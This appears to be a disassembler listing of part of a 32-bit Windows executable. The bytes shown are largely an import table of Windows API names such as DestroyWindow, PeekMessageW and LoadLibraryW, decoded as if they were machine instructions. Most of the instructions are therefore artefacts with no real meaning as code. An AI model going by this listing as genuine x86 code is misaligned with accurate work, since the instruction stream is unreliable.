  428d7e:	jne    0x428de1
  428d80:	ins    BYTE PTR es:[edi],dx
  428d81:	push   edx
  428d82:	arpl   WORD PTR gs:[eax+eax*1+0x32],si
  428d87:	add    dl,BYTE PTR [ebx+0x65]
  428d8a:	je     0x428dcf
  428d8c:	popa   
  428d8d:	jb     0x428df4
  428d8f:	je     0x428de1
  428d91:	outs   dx,DWORD PTR ds:[esi]
  428d92:	jae    0x428d94
  428d94:	and    al,0x0
  428d96:	inc    ebx
  428d97:	push   0x65676e61
  428d9c:	dec    ebp
  428d9d:	outs   dx,BYTE PTR gs:[esi]
  428d9f:	jne    0x428df8
  428da1:	add    BYTE PTR [eax+0x73654400],bl
  428da7:	je     0x428e1b
  428da9:	outs   dx,DWORD PTR ds:[esi]
  428daa:	jns    0x428e03
  428dac:	imul   ebp,DWORD PTR [esi+0x64],0xf500776f
  428db3:	add    DWORD PTR [eax+0x6f],edx
  428db6:	jae    0x428e2c
  428db8:	push   esp
  428db9:	push   0x64616572
  428dbe:	dec    ebp
  428dbf:	gs jae 0x428e35
  428dc2:	popa   
  428dc3:	addr16 gs push edi
  428dc6:	add    BYTE PTR [eax],al
  428dc8:	push   edi
  428dc9:	add    dl,BYTE PTR [ebx+0x65]
  428dcc:	je     0x428e1e
  428dce:	jb     0x428e3f
  428dd0:	jo     0x428e29
  428dd2:	add    BYTE PTR [eax],al
  428dd4:	mov    al,0x1
  428dd6:	dec    esp
  428dd7:	outs   dx,DWORD PTR ds:[esi]
  428dd8:	popa   
  428dd9:	fs dec ecx
  428ddb:	arpl   WORD PTR [edi+0x6e],bp
  428dde:	push   edi
  428ddf:	add    bl,bh
  428de1:	add    DWORD PTR [eax+0x74],edx
  428de4:	dec    ecx
  428de5:	outs   dx,BYTE PTR ds:[esi]
  428de6:	push   edx
  428de7:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428dec:	dec    edx
  428ded:	add    dl,BYTE PTR [ebx+0x65]
  428df0:	je     0x428e3f
  428df2:	outs   dx,BYTE PTR gs:[esi]
  428df4:	jne    0x428e3a
  428df6:	gs popaw 
  428df9:	jne    0x428e67
  428dfb:	je     0x428e46
  428dfd:	je     0x428e64
  428dff:	ins    DWORD PTR es:[edi],dx
  428e00:	add    BYTE PTR [eax],al
  428e02:	sti    
  428e03:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428e07:	arpl   WORD PTR [ebx+0x50],bp
  428e0a:	outs   dx,DWORD PTR ds:[esi]
  428e0b:	jo     0x428e82
  428e0d:	jo     0x428e5c
  428e0f:	outs   dx,BYTE PTR gs:[esi]
  428e11:	jne    0x428e13
  428e13:	add    BYTE PTR [ebp+0x64705502],ah
  428e19:	popa   
  428e1a:	je     0x428e81
  428e1c:	push   edi
  428e1d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428e24:	push   ss
  428e25:	add    dl,BYTE PTR [edx+0x65]
  428e28:	ins    DWORD PTR es:[edi],dx
  428e29:	outs   dx,DWORD PTR ds:[esi]
  428e2a:	jbe    0x428e91
  428e2c:	dec    ebp
  428e2d:	outs   dx,BYTE PTR gs:[esi]
  428e2f:	jne    0x428e31
  428e31:	add    BYTE PTR [edx+0x61724400],dh
  428e37:	ja     0x428e7f
  428e39:	jb     0x428e9c
  428e3b:	ins    DWORD PTR es:[edi],dx
  428e3c:	gs inc ebx
  428e3e:	outs   dx,DWORD PTR ds:[esi]
  428e3f:	outs   dx,BYTE PTR ds:[esi]
  428e40:	je     0x428eb4
  428e42:	outs   dx,DWORD PTR ds:[esi]
  428e43:	ins    BYTE PTR es:[edi],dx
  428e44:	add    BYTE PTR [eax],al
  428e46:	mov    dl,0x1
  428e48:	dec    esp
  428e49:	outs   dx,DWORD PTR ds:[esi]
  428e4a:	popa   
  428e4b:	fs dec ecx
  428e4d:	ins    DWORD PTR es:[edi],dx
  428e4e:	popa   
  428e4f:	addr16 gs push edi
  428e52:	add    BYTE PTR [eax],al
  428e54:	add    al,BYTE PTR [eax]
  428e56:	inc    ecx
  428e57:	fs push 0x75
  428e5a:	jae    0x428ed0
  428e5c:	push   edi
  428e5d:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428e64:	arpl   WORD PTR [eax+eax*1+0x0],si
  428e68:	add    DWORD PTR [ecx],0x65536e49
  428e6e:	outs   dx,BYTE PTR ds:[esi]
  428e6f:	fs dec ebp
  428e71:	gs jae 0x428ee7
  428e74:	popa   
  428e75:	addr16 gs inc ebp
  428e78:	js     0x428e7a
  428e7a:	xchg   BYTE PTR [ecx],al
  428e7c:	dec    ecx
  428e7d:	outs   dx,BYTE PTR ds:[esi]
  428e7e:	jae    0x428ee5
  428e80:	jb     0x428ef6
  428e82:	dec    ebp
  428e83:	outs   dx,BYTE PTR gs:[esi]
  428e85:	jne    0x428ede
  428e87:	add    BYTE PTR ds:0x6c6c4100,al
  428e8d:	outs   dx,DWORD PTR ds:[esi]
  428e8e:	ja     0x428ee3
  428e90:	gs je  0x428ed9
  428e93:	outs   dx,DWORD PTR ds:[esi]
  428e94:	jb     0x428efb
  428e96:	addr16 jb 0x428f08
  428e99:	jne    0x428f09
  428e9b:	fs push edi
  428e9d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428ea4:	add    BYTE PTR [edx],0x53
  428ea7:	ja     0x428f0a
  428ea9:	jo     0x428ef8
  428eab:	outs   dx,DWORD PTR ds:[esi]
  428eac:	jne    0x428f21
  428eae:	gs inc edx
  428eb0:	jne    0x428f26
  428eb2:	je     0x428f23
  428eb4:	outs   dx,BYTE PTR ds:[esi]
  428eb5:	add    bh,ch
  428eb7:	add    DWORD PTR [eax+0x65],edx
  428eba:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  428ebf:	jae    0x428f22
  428ec1:	addr16 gs push edi
  428ec4:	add    BYTE PTR [eax],al
  428ec6:	cdq    
  428ec7:	add    BYTE PTR [ecx+ebp*2+0x61],al
  428ecb:	ins    BYTE PTR es:[edi],dx
  428ecc:	outs   dx,DWORD PTR ds:[esi]
  428ecd:	addr16 inc edx
  428ecf:	outs   dx,DWORD PTR ds:[esi]
  428ed0:	js     0x428f1b
  428ed2:	outs   dx,BYTE PTR ds:[esi]
  428ed3:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428edb:	jb     0x428f3e
  428edd:	ins    DWORD PTR es:[edi],dx
  428ede:	inc    ecx
  428edf:	add    BYTE PTR [ebp+0x0],bl
  428ee2:	inc    ebx
  428ee3:	jb     0x428f4a
  428ee5:	popa   
  428ee6:	je     0x428f4d
  428ee8:	dec    ecx
  428ee9:	arpl   WORD PTR [edi+0x6e],bp
  428eec:	dec    ecx
  428eed:	outs   dx,BYTE PTR ds:[esi]
  428eee:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  428ef6:	stos   BYTE PTR es:[edi],al
  428ef7:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428efb:	fs inc edx
  428efd:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb1005770
  428f05:	add    dl,BYTE PTR [esi+0x6b]
  428f08:	dec    ebx
  428f09:	gs jns 0x428f5f
  428f0c:	arpl   WORD PTR [ecx+0x6e],sp
  428f0f:	push   edi
  428f10:	add    BYTE PTR [eax],al
  428f12:	adc    eax,DWORD PTR [ecx]
  428f14:	inc    edi
  428f15:	gs je  0x428f5c
  428f18:	outs   dx,DWORD PTR ds:[esi]
  428f19:	jne    0x428f7d
  428f1b:	ins    BYTE PTR es:[edi],dx
  428f1c:	gs inc ebx
  428f1e:	ins    BYTE PTR es:[edi],dx
  428f1f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  428f26:	add    BYTE PTR [eax],al
  428f28:	add    WORD PTR [edi+0x65],ax
  428f2c:	je     0x428f83
  428f2e:	jae    0x428f95
  428f30:	jb     0x428f81
  428f32:	bound  ebp,QWORD PTR [edx+0x65]
  428f35:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428f39:	outs   dx,WORD PTR ds:[esi]
  428f3b:	jb     0x428faa
  428f3d:	popa   
  428f3e:	je     0x428fa9
  428f40:	outs   dx,DWORD PTR ds:[esi]
  428f41:	outs   dx,BYTE PTR ds:[esi]
  428f42:	push   edi
  428f43:	add    BYTE PTR [eax+0x1],bl
  428f46:	inc    edi
  428f47:	gs je  0x428f9d
  428f4a:	jne    0x428fae
  428f4c:	dec    ebp
  428f4d:	outs   dx,BYTE PTR gs:[esi]
  428f4f:	jne    0x428f51
  428f51:	add    dh,dh
  428f53:	add    BYTE PTR [edi+0x65],al
  428f56:	je     0x428f9b
  428f58:	ins    BYTE PTR es:[edi],dx
  428f59:	popa   
  428f5a:	jae    0x428fcf
  428f5c:	dec    ecx
  428f5d:	outs   dx,BYTE PTR ds:[esi]
  428f5e:	outs   dx,WORD PTR ds:[esi]
  428f60:	inc    ebp
  428f61:	js     0x428fba
  428f63:	add    BYTE PTR [ecx+eax*1],cl
  428f66:	inc    edi
  428f67:	gs je  0x428fae
  428f6a:	gs jae 0x428fd8
  428f6d:	je     0x428fde
  428f6f:	jo     0x428fc8
  428f71:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428f78:	sub    eax,0x6e655302
  428f7d:	fs dec esi
  428f7f:	outs   dx,DWORD PTR ds:[esi]
  428f80:	je     0x428feb
  428f82:	data16 jns 0x428fd2
  428f85:	gs jae 0x428ffb
  428f88:	popa   
  428f89:	addr16 gs push edi
  428f8c:	add    BYTE PTR [eax],al
  428f8e:	and    al,BYTE PTR [edx]
  428f90:	push   ebx
  428f91:	outs   dx,BYTE PTR gs:[esi]
  428f93:	fs inc esp
  428f95:	ins    BYTE PTR es:[edi],dx
  428f96:	addr16 dec ecx
  428f98:	je     0x428fff
  428f9a:	ins    DWORD PTR es:[edi],dx
  428f9b:	dec    ebp
  428f9c:	gs jae 0x429012
  428f9f:	popa   
  428fa0:	addr16 gs push edi
  428fa3:	add    BYTE PTR [eax],ch
  428fa5:	add    DWORD PTR [edi+0x65],eax
  428fa8:	je     0x428ff6
  428faa:	popa   
  428fab:	jae    0x429021
  428fad:	inc    ecx
  428fae:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428fb2:	gs push eax
  428fb4:	outs   dx,DWORD PTR ds:[esi]
  428fb5:	jo     0x42902c
  428fb7:	jo     0x428fb9
  428fb9:	add    BYTE PTR [ecx],ch
  428fbb:	add    BYTE PTR [ebx+0x68],al
  428fbe:	popa   
  428fbf:	jb     0x42900d
  428fc1:	outs   dx,DWORD PTR ds:[esi]
  428fc2:	ja     0x429029
  428fc4:	jb     0x42901d
  428fc6:	add    BYTE PTR [eax],al
  428fc8:	xor    al,BYTE PTR [ecx]
  428fca:	inc    edi
  428fcb:	gs je  0x42901b
  428fce:	outs   dx,BYTE PTR gs:[esi]
  428fd0:	jne    0x42901b
  428fd2:	je     0x429039
  428fd4:	ins    DWORD PTR es:[edi],dx
  428fd5:	inc    ebx
  428fd6:	outs   dx,DWORD PTR ds:[esi]
  428fd7:	jne    0x429047
  428fd9:	je     0x428fdb
  428fdb:	add    BYTE PTR ds:0x74655302,bh
  428fe1:	inc    esp
  428fe2:	ins    BYTE PTR es:[edi],dx
  428fe3:	addr16 dec ecx
  428fe5:	je     0x42904c
  428fe7:	ins    DWORD PTR es:[edi],dx
  428fe8:	dec    ecx
  428fe9:	outs   dx,BYTE PTR ds:[esi]
  428fea:	je     0x428fec
  428fec:	mov    al,ds:0x57734901
  428ff1:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428ff8:	mov    ds:0x57734901,al
  428ffd:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  429004:	imul   esp,DWORD PTR [ebx+0x6f],0xe7006564
  42900b:	add    DWORD PTR [edi+0x70],ecx
  42900e:	outs   dx,BYTE PTR gs:[esi]
  429010:	inc    esp
  429011:	gs jae 0x42907f
  429014:	je     0x429085
  429016:	jo     0x42906f
  429018:	add    BYTE PTR [eax],al
  42901a:	cmp    al,BYTE PTR [eax]
  42901c:	inc    ebx
  42901d:	push   0x446b6365
  429022:	ins    BYTE PTR es:[edi],dx
  429023:	addr16 inc edx
  429025:	jne    0x42909b
  429027:	je     0x429098
  429029:	outs   dx,BYTE PTR ds:[esi]
  42902a:	add    BYTE PTR [eax],al
  42902c:	mov    eax,DWORD PTR [ecx]
  42902e:	dec    ecx
  42902f:	outs   dx,BYTE PTR ds:[esi]
  429030:	jbe    0x429097
  429032:	jb     0x4290a8
  429034:	push   edx
  429035:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42903a:	pop    DWORD PTR [eax]
  42903c:	inc    esp
  42903d:	gs push di
  429040:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  429047:	outs   dx,DWORD PTR ds:[esi]
  429048:	arpl   WORD PTR [edi+0x0],dx
  42904b:	add    BYTE PTR ds:0x74654701,cl
  429051:	inc    esp
  429052:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  429059:	jae    0x4290c0
  42905b:	push   ebp
  42905c:	outs   dx,BYTE PTR ds:[esi]
  42905d:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x47016500
  429065:	gs je  0x4290bd
  429068:	jae    0x4290cf
  42906a:	jb     0x4290bb
  42906c:	bound  ebp,QWORD PTR [edx+0x65]
  42906f:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  429073:	outs   dx,WORD PTR ds:[esi]
  429075:	jb     0x4290e4
  429077:	popa   
  429078:	je     0x4290e3
  42907a:	outs   dx,DWORD PTR ds:[esi]
  42907b:	outs   dx,BYTE PTR ds:[esi]
  42907c:	inc    ecx
  42907d:	add    BYTE PTR [ecx+0x44734901],bl
  429083:	ins    BYTE PTR es:[edi],dx
  429084:	addr16 inc edx
  429086:	jne    0x4290fc
  429088:	je     0x4290f9
  42908a:	outs   dx,BYTE PTR ds:[esi]
  42908b:	inc    ebx
  42908c:	push   0x656b6365
  429091:	add    BYTE PTR fs:[eax],al
  429094:	ins    DWORD PTR es:[edi],dx
  429095:	add    DWORD PTR [edi+0x65],eax
  429098:	je     0x4290f1
  42909a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4290a1:	outs   dx,BYTE PTR ds:[esi]
  4290a2:	addr16 push edi
  4290a4:	add    BYTE PTR [eax],al
  4290a6:	popa   
  4290a7:	add    BYTE PTR [ebx+0x72],al
  4290aa:	gs popa 
  4290ac:	je     0x429113
  4290ae:	push   eax
  4290af:	outs   dx,DWORD PTR ds:[esi]
  4290b0:	jo     0x429127
  4290b2:	jo     0x429101
  4290b4:	outs   dx,BYTE PTR gs:[esi]
  4290b6:	jne    0x4290b8
  4290b8:	sbb    eax,DWORD PTR [eax]
  4290ba:	inc    ebx
  4290bb:	popa   
  4290bc:	ins    BYTE PTR es:[edi],dx
  4290bd:	ins    BYTE PTR es:[edi],dx
  4290be:	push   edi
  4290bf:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4290c6:	outs   dx,DWORD PTR ds:[esi]
  4290c7:	arpl   WORD PTR [edi+0x0],dx
  4290ca:	stos   DWORD PTR es:[edi],eax
  4290cb:	add    BYTE PTR [edx+esi*2+0x61],al
  4290cf:	ja     0x429112
  4290d1:	outs   dx,BYTE PTR ds:[esi]
  4290d2:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  4290d9:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  4290de:	sahf   
  4290df:	add    DWORD PTR [ecx+0x73],ecx
  4290e2:	push   edx
  4290e3:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4290e8:	jo     0x42915e
  4290ea:	jns    0x4290ec
  4290ec:	inc    BYTE PTR [eax]
  4290ee:	inc    edi
  4290ef:	gs je  0x429135
  4290f2:	ins    BYTE PTR es:[edi],dx
  4290f3:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4290fa:	jb     0x4290fc
  4290fc:	lds    eax,FWORD PTR [eax]
  4290fe:	inc    ebp
  4290ff:	outs   dx,BYTE PTR ds:[esi]
  429100:	fs push eax
  429102:	popa   
  429103:	imul   ebp,DWORD PTR [esi+0x74],0xdc0000
  42910a:	inc    ebp
  42910b:	outs   dx,BYTE PTR ds:[esi]
  42910c:	jne    0x42917b
  42910e:	push   edi
  42910f:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  429116:	xchg   DWORD PTR [ecx],eax
  429118:	dec    ecx
  429119:	outs   dx,BYTE PTR ds:[esi]
  42911a:	je     0x429181
  42911c:	jb     0x42918c
  42911e:	popa   
  42911f:	ins    BYTE PTR es:[edi],dx
  429120:	inc    edi
  429121:	gs je  0x42917b
  429124:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  42912b:	js     0x4291a1
  42912d:	add    BYTE PTR [eax+0x43734901],dl
  429133:	push   0x6f4c7261
  429138:	ja     0x42919f
  42913a:	jb     0x42917d
  42913c:	add    BYTE PTR [eax],al
  42913e:	aad    0x1
  429140:	dec    ebp
  429141:	gs jae 0x4291b7
  429144:	popa   
  429145:	addr16 gs inc edx
  429148:	outs   dx,DWORD PTR ds:[esi]
  429149:	js     0x4291a2
  42914b:	add    BYTE PTR [edi+0x636f4c01],bh
  429151:	imul   edx,DWORD PTR [edi+0x69],0x6e
  429155:	outs   dx,DWORD PTR fs:[esi]
  429157:	ja     0x4291ae
  429159:	jo     0x4291bf
  42915b:	popa   
  42915c:	je     0x4291c3
  42915e:	add    BYTE PTR [eax],al
  429160:	add    BYTE PTR es:[ebx+0x68],al
  429164:	popa   
  429165:	jb     0x4291b3
  429167:	outs   dx,DWORD PTR ds:[esi]
  429168:	ja     0x4291cf
  42916a:	jb     0x4291ad
  42916c:	add    BYTE PTR [eax],al
  42916e:	call   0x6e6f:0x696e5502
  429175:	push   edx
  429176:	arpl   WORD PTR gs:[eax+eax*1+0x38],si
  42917b:	add    DWORD PTR [edi+0x65],eax
  42917e:	je     0x4291cd
  429180:	outs   dx,BYTE PTR gs:[esi]
  429182:	jne    0x4291d7
  429184:	je     0x4291f8
  429186:	imul   ebp,DWORD PTR [esi+0x67],0xd9000041
  42918d:	add    DWORD PTR [ebp+0x6f],ecx
  429190:	outs   dx,BYTE PTR ds:[esi]
  429191:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  429199:	push   edx
  42919a:	arpl   WORD PTR gs:[eax+eax*1+0x6d],si
  42919f:	add    dl,BYTE PTR [ebx+0x65]
  4291a2:	je     0x4291fb
  4291a4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4291ab:	outs   dx,BYTE PTR ds:[esi]
  4291ac:	addr16 inc ecx
  4291ae:	add    BYTE PTR [eax],al
  4291b0:	or     al,0x0
  4291b2:	inc    edx
  4291b3:	imul   ebp,DWORD PTR gs:[bp+0x44],0x72656665
  4291bc:	push   edi
  4291bd:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4291c4:	jae    0x4291c6
  4291c6:	add    BYTE PTR cs:[ebx+0x68],al
  4291ca:	popa   
  4291cb:	jb     0x42921d
  4291cd:	jb     0x429234
  4291cf:	jbe    0x429212
  4291d1:	add    bl,bl
  4291d3:	add    DWORD PTR [ebp+0x6f],ecx
  4291d6:	jbe    0x42923d
  4291d8:	push   edi
  4291d9:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4291e0:	mov    dh,0x1
  4291e2:	dec    esp
  4291e3:	outs   dx,DWORD PTR ds:[esi]
  4291e4:	popa   
  4291e5:	fs dec ebp
  4291e7:	outs   dx,BYTE PTR gs:[esi]
  4291e9:	jne    0x42922c
  4291eb:	add    BYTE PTR [ebp+0x79656b02],bh
  4291f1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  4291f5:	jbe    0x42925c
  4291f7:	outs   dx,BYTE PTR ds:[esi]
  4291f8:	je     0x4291fa
  4291fa:	pop    esp
  4291fb:	add    DWORD PTR [edi+0x65],eax
  4291fe:	je     0x429253
  429200:	jns    0x429275
  429202:	je     0x429269
  429204:	ins    DWORD PTR es:[edi],dx
  429205:	dec    ebp
  429206:	gs je  0x42927b
  429209:	imul   esp,DWORD PTR [ebx+0x73],0x1af0000
  429210:	dec    esp
  429211:	outs   dx,DWORD PTR ds:[esi]
  429212:	popa   
  429213:	fs dec ecx
  429215:	arpl   WORD PTR [edi+0x6e],bp
  429218:	inc    ecx
  429219:	add    BYTE PTR [ebx+0x1],al
  42921c:	inc    edi
  42921d:	gs je  0x42926e
  429220:	gs js  0x429297
  429223:	inc    esp
  429224:	ins    BYTE PTR es:[edi],dx
  429225:	addr16 push esp
  429227:	popa   
  429228:	bound  ecx,QWORD PTR [ecx+0x74]
  42922b:	gs ins DWORD PTR es:[edi],dx
  42922d:	add    BYTE PTR [ebx+0x61724400],dh
  429233:	ja     0x42927e
  429235:	arpl   WORD PTR [edi+0x6e],bp
  429238:	add    BYTE PTR [eax],al
  42923a:	std    
  42923b:	add    BYTE PTR [edi+0x65],al
  42923e:	je     0x429283
  429240:	ins    BYTE PTR es:[edi],dx
  429241:	imul   esp,DWORD PTR [ebp+0x6e],0x63655274
  429248:	je     0x42924a
  42924a:	add    DWORD PTR ds:[edi+0x65],eax
  42924e:	je     0x42929d
  429250:	gs jae 0x4292c6
  429253:	popa   
  429254:	addr16 gs push edi
  429257:	add    BYTE PTR [edx+0x1],al
  42925a:	inc    edi
  42925b:	gs je  0x4292ac
  42925e:	gs js  0x4292d5
  429261:	inc    esp
  429262:	ins    BYTE PTR es:[edi],dx
  429263:	addr16 inc edi
  429265:	jb     0x4292d6
  429267:	jne    0x4292d9
  429269:	dec    ecx
  42926a:	je     0x4292d1
  42926c:	ins    DWORD PTR es:[edi],dx
  42926d:	add    BYTE PTR ds:0x6c655202,dl
  429273:	gs popa 
  429275:	jae    0x4292dc
  429277:	inc    esp
  429278:	inc    ebx
  429279:	add    BYTE PTR [ebp+0x53],dl
  42927c:	inc    ebp
  42927d:	push   edx
  42927e:	xor    esi,DWORD PTR [edx]
  429280:	cs fs ins BYTE PTR es:[edi],dx
  429283:	ins    BYTE PTR es:[edi],dx
  429284:	add    BYTE PTR [eax],al
  429286:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  42928a:	jbe    0x4292f1
  42928c:	inc    esi
  42928d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x71004178
  429295:	add    DWORD PTR [esi+0x69],eax
  429298:	outs   dx,BYTE PTR ds:[esi]
  429299:	fs push edx
  42929b:	gs jae 0x42930d
  42929e:	jne    0x429312
  4292a0:	arpl   WORD PTR [ebp+0x45],sp
  4292a3:	js     0x4292fc
  4292a5:	add    BYTE PTR [ebx],dl
  4292a7:	add    al,0x53
  4292a9:	gs je  0x4292ef
  4292ac:	jne    0x429320
  4292ae:	jb     0x429315
  4292b0:	outs   dx,BYTE PTR ds:[esi]
  4292b1:	je     0x4292f7
  4292b3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4292ba:	jns    0x4292fd
  4292bc:	add    BYTE PTR [eax],al
  4292be:	sub    BYTE PTR [ebx+edx*2],al
  4292c1:	gs je  0x42930c
  4292c4:	popa   
  4292c5:	outs   dx,BYTE PTR ds:[esi]
  4292c6:	fs ins BYTE PTR es:[edi],dx
  4292c8:	gs inc ebx
  4292ca:	outs   dx,DWORD PTR ds:[esi]
  4292cb:	jne    0x42933b
  4292cd:	je     0x4292cf
  4292cf:	add    BYTE PTR [ebx+0x6d6f4300],dh
  4292d5:	jo     0x429338
  4292d7:	jb     0x42933e
  4292d9:	push   ebx
  4292da:	je     0x42934e
  4292dc:	imul   ebp,DWORD PTR [esi+0x67],0x52000041
  4292e3:	add    DWORD PTR [esi+0x69],eax
  4292e6:	ins    BYTE PTR es:[edi],dx
  4292e7:	gs push esp
  4292e9:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  4292f0:	arpl   WORD PTR [ecx+0x6c],sp
  4292f3:	inc    esi
  4292f4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4292fc:	cmp    eax,DWORD PTR [ebx+edx*2]
  4292ff:	gs je  0x429355
  429302:	jns    0x429377
  429304:	je     0x42936b
  429306:	ins    DWORD PTR es:[edi],dx
  429307:	push   esp
  429308:	imul   ebp,DWORD PTR [ebp+0x65],0x47018e00
  42930f:	gs je  0x429353
  429312:	inc    ebx
  429313:	push   eax
  429314:	add    BYTE PTR [eax],al
  429316:	arpl   WORD PTR [ecx],ax
  429318:	inc    esi
  429319:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  429320:	je     0x429368
  429322:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x33f0000
  42932a:	dec    esp
  42932b:	outs   dx,DWORD PTR ds:[esi]
  42932c:	popa   
  42932d:	fs dec esp
  42932f:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  429336:	add    BYTE PTR [eax],al
  429338:	push   ss
  429339:	add    DWORD PTR [ebp+0x6e],eax
  42933c:	je     0x4293a3
  42933e:	jb     0x429383
  429340:	jb     0x4293ab
  429342:	je     0x4293ad
  429344:	arpl   WORD PTR [ecx+0x6c],sp
  429347:	push   ebx
  429348:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  42934d:	outs   dx,BYTE PTR ds:[esi]
  42934e:	add    BYTE PTR [eax],al
  429350:	cdq    
  429351:	add    DWORD PTR [edi+0x65],eax
  429354:	je     0x429399
  429356:	outs   dx,DWORD PTR ds:[esi]
  429357:	ins    DWORD PTR es:[edi],dx
  429358:	ins    DWORD PTR es:[edi],dx
  429359:	inc    ebx
  42935a:	outs   dx,DWORD PTR ds:[esi]
  42935b:	outs   dx,BYTE PTR ds:[esi]
  42935c:	imul   sp,WORD PTR [edi+0x0],0x188
  429362:	inc    esi
  429363:	jb     0x4293ca
  429365:	gs push edx
  429367:	gs jae 0x4293d9
  42936a:	jne    0x4293de
  42936c:	arpl   WORD PTR [ebp+0x0],sp
  42936f:	add    BYTE PTR [eax+0x1],ah
  429372:	inc    esi
  429373:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  42937a:	je     0x4293c2
  42937c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x1930000
  429384:	inc    edi
  429385:	gs je  0x4293ca
  429388:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  42938f:	jo     0x4293f6
  429391:	push   edi
  429392:	add    BYTE PTR [eax],al
  429394:	fiadd  WORD PTR [esp+ebp*2]
  429397:	jae    0x42940d
  429399:	jb     0x429407
  42939b:	outs   dx,BYTE PTR gs:[esi]
  42939d:	push   edi
  42939e:	add    BYTE PTR [eax],al
  4293a0:	pop    ds
  4293a1:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4293a5:	popa   
  4293a6:	ins    BYTE PTR es:[edi],dx
  4293a7:	push   ebx
  4293a8:	imul   edi,DWORD PTR [edx+0x65],0x47025700
  4293af:	gs je  0x429405
  4293b2:	jns    0x429427
  4293b4:	je     0x42941b
  4293b6:	ins    DWORD PTR es:[edi],dx
  4293b7:	inc    esp
  4293b8:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4293bf:	jns    0x429402
  4293c1:	add    BYTE PTR [esi+0x74654701],ah
  4293c7:	inc    ebx
  4293c8:	outs   dx,DWORD PTR ds:[esi]
  4293c9:	ins    DWORD PTR es:[edi],dx
  4293ca:	jo     0x429441
  4293cc:	je     0x429433
  4293ce:	jb     0x42941e
  4293d0:	popa   
  4293d1:	ins    DWORD PTR es:[edi],dx
  4293d2:	gs push edi
  4293d4:	add    BYTE PTR [eax],al
  4293d6:	rol    BYTE PTR [eax],cl
  4293d8:	inc    ebx
  4293d9:	jb     0x429440
  4293db:	popa   
  4293dc:	je     0x429443
  4293de:	inc    esi
  4293df:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4293e7:	outs   dx,BYTE PTR ds:[esi]
  4293e8:	addr16 inc ecx
  4293ea:	add    BYTE PTR [eax],al
  4293ec:	retf   0x4300
  4293ef:	jb     0x429456
  4293f1:	popa   
  4293f2:	je     0x429459
  4293f4:	inc    esp
  4293f5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4293fc:	jns    0x429455
  4293fe:	add    BYTE PTR [eax],al
  429400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429401:	add    BYTE PTR [ebx+0x61],al
  429404:	outs   dx,BYTE PTR ds:[esi]
  429405:	arpl   WORD PTR [ebp+0x6c],sp
  429408:	push   edi
  429409:	popa   
  42940a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  429412:	ins    DWORD PTR es:[edi],dx
  429413:	gs jb  0x429416
  429416:	add    al,0x2
  429418:	inc    edi
  429419:	gs je  0x429468
  42941c:	outs   dx,DWORD PTR ds:[esi]
  42941d:	arpl   WORD PTR [ecx+0x6c],sp
  429420:	gs dec ecx
  429422:	outs   dx,BYTE PTR ds:[esi]
  429423:	outs   dx,WORD PTR ds:[esi]
  429425:	inc    ecx
  429426:	add    BYTE PTR [eax],al
  429428:	xor    eax,0x766f4d03
  42942d:	gs inc esi
  42942f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47019d00
  429437:	gs je  0x42947d
  42943a:	outs   dx,DWORD PTR ds:[esi]
  42943b:	ins    DWORD PTR es:[edi],dx
  42943c:	ins    DWORD PTR es:[edi],dx
  42943d:	push   ebx
  42943e:	je     0x4294a1
  429440:	je     0x4294a7
  429442:	add    BYTE PTR [eax],al
  429444:	mov    ah,0x3
  429446:	push   edx
  429447:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x61577265
  429450:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  429458:	ins    BYTE PTR es:[di],dx
  42945a:	gs dec edi
